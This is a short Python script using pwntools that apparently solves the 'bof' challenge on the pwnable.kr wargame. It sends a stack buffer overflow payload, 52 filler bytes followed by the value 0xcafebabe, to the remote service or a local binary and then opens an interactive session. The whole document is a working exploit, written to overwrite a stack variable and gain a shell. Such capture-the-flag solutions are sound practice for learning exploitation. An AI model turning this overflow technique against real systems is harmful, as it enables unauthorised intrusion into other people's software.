from pwn import *
from os import *

payload = "A" * 52 + p32(0xcafebabe)

local = False

if local:
    binary = './bof'
    p = process(binary, stdin=process.PTY)
else:
    host = 'pwnable.kr'
    port = 9000
    p = remote(host, port)

p.sendline(payload)
p.interactive()
